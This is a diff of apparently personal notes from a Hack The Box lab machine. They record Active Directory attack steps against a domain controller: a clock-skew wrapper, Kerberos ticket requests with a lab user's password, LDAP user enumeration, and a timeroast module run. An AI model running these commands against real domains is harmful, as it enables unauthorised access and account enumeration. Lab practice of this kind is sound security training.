@@ -1,7 +1,44 @@
 ff() {
   faketime "$(ntpdate -q 10.10.11.75 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" "$@"
 }
+---
+└─$ ff impacket-getTGT rustykey.htb/'rr.parker':'8#t5HE8L!W3A'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
+[*] Saving ticket in rr.parker.ccache
+
+┌──(batman㉿ikal)-[~/htb]
+└─$ klist
+Ticket cache: FILE:./rr.parker.ccache
+Default principal: rr.parker@RUSTYKEY.HTB
+
+Valid starting       Expires              Service principal
+08/19/2025 10:35:34  08/19/2025 20:35:34  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
+        renew until 08/20/2025 10:35:34
+
+┌──(batman㉿ikal)-[~/htb]
+└─$ nxc ldap 10.10.11.75 -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'  -k --users
+LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
+LDAP        10.10.11.75     389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A KRB_AP_ERR_SKEW
+
+┌──(batman㉿ikal)-[~/htb]
+└─$ ff nxc ldap 10.10.11.75 -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A'  -k --users
+LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb)
+LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
+LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
+LDAP        10.10.11.75     389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
+LDAP        10.10.11.75     389    DC               Administrator                 2025-06-04 18:52:22 0        Built-in account for administering the computer/domain
+LDAP        10.10.11.75     389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
+LDAP        10.10.11.75     389    DC               krbtgt                        2024-12-26 19:53:40 0        Key Distribution Center Service Account
+LDAP        10.10.11.75     389    DC               rr.parker                     2025-06-04 18:54:15 0
+LDAP        10.10.11.75     389    DC               mm.turner                     2024-12-27 05:18:39 0
+LDAP        10.10.11.75     389    DC               bb.morgan                     2025-08-19 10:31:42 0
+LDAP        10.10.11.75     389    DC               gg.anderson                   2025-08-19 10:31:42 0
+LDAP        10.10.11.75     389    DC               dd.ali                        2025-08-19 10:31:42 0
+LDAP        10.10.11.75     389    DC               ee.reed                       2025-08-19 10:31:42 0
+LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 06:34:50 0
+LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 19:30:18 0
+---
 ff nxc smb 10.10.11.75 -d rustykey.htb -u 'rr.parker'  -k -M timeroast
 ntpdig: no eligible servers
 SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
